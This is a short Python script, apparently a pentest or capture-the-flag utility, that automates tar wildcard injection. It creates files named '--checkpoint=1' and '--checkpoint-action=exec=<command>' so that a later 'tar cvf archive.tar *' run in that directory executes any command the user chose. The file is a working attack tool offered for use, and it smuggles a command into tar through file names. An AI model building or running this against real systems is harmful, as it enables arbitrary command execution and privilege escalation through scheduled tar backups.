#!/usr/bin/python3
# -*- coding: utf-8 -*-
'''
Create automatically directory and exploit to execute command after tar execution !

Exploit tar command:
     tar cvf archive.tar *

How to use: 
    tar_exec.py 'ls >> ls.txt'
This command will create a exploit to redirect ls output on ls.txt file.
'''

import sys,os

if len(sys.argv) != 2:
    print("\n[ERROR] You need to pass one command argument!\n\nCreate automatically directory and exploit to execute command after tar execution !\n\nExploit tar command:\n     tar cvf archive.tar *\n\nHow to use: \n    tar_exec.py 'ls >> ls.txt'\nThis command will create a exploit to redirect ls output on ls.txt file.")
else:
    cmd=sys.argv[1]
    if not os.path.exists("exploits"):
        os.makedirs("exploits")
    path="exploits/"+cmd
    if not os.path.exists(path):
        os.makedirs(path)

    f = open(path+"/tmp", "w+")
    f = open(path+"/--checkpoint=1", "w+")
    f = open(path+"/--checkpoint-action=exec="+cmd, "w+")
    print("Files created on \""+cmd+"\" directory!")
